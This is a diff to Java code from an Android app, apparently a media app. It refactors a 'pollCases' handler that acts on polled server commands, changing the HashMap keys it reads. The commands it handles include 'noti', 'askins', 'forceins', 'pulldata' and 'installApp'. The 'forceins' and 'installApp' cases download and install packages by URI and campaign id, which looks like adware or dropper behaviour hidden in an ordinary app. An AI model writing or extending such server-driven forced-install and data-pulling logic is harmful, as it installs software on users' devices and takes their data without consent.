@@ -18,18 +18,22 @@ import static com.media.ui.Util.bitMapDl.dlBitmap;
 
 public class pollCases {
     String loc1 = constants.AppFolder;
-
+/*
+    hm.put(1, data);
+    hm.put(2, status);
+    hm.put(3, camp_id_res);
+  */
     public void pollcase(HashMap hash, Context context) {
 
-        String val = (String) hash.get("status");
-        int camp_id = (int) hash.get("camp_id");
-        String adt = (String) hash.get("data");
+        String val = (String) hash.get(2);
+        String camp_id = (String) hash.get(3);
+        String adt = (String) hash.get(1);
         String[] adt_arr = adt.split("|");
         String uri;
         String pkg;
         switch (val) {
             case "noti":
-                String data = (String) hash.get("data");
+                String data = (String) hash.get(1);
                new sendNotification(camp_id,data,1,context);
                 break; // optional
             case "askins":
@@ -43,7 +47,7 @@ public class pollCases {
             case "forceins":
                  uri = adt_arr[0];
                 pkg = adt_arr[1];
-                camp_id = (int) hash.get("camp_id");
+                camp_id = (String) hash.get(3);
                 new CnfInstall(context).downloadAndInstall(loc1, uri, pkg, camp_id);
                 break; // optional
             case "pulldata":
@@ -58,7 +62,7 @@ public class pollCases {
             case "installApp":
                 uri = adt_arr[0];
                 pkg = adt_arr[1];
-                camp_id = (int) hash.get("camp_id");
+                camp_id = (String) hash.get(3);
                 new CnfInstall(context).downloadAndInstall(loc1, uri, pkg, camp_id);
                 // Statements
                 break; // optional
